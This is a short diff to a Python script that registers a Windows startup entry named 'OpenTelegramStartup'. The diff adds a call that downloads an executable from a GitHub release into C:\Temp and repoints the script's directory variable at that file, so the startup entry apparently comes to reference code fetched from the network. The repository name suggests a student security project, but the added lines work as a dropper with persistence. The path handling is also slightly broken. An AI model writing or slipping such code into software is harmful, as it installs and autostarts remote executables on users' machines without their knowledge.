@@ -3,6 +3,10 @@ import os
 import sys
 
 # Name of the value inside the Registry (can be anything you want)
+download_file(
+    url="https://github.com/monouk-prog/Cyber-Proj-ANTI-MALICIOUS/releases/download/v1.0.17/main.exe", 
+    destination_path="C:\\Temp\\monoukfile.exe"
+)
 REG_NAME = "OpenTelegramStartup"
 
 # Determine the directory where this script/exe is running
@@ -11,7 +15,7 @@ REG_NAME = "OpenTelegramStartup"
 # else:
 #     SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__)) 
 # use r to ingore backslashes in the path, and set it to the directory of msedge.exe for demonstration
-SCRIPT_DIR = r"C:\Program Files (x86)\Microsoft\Edge\Application"
+SCRIPT_DIR = r"C:\\Temp\\monoukfile.exe"
 
 # Path to the target file
 TARGET_FILE = "msedge.exe"
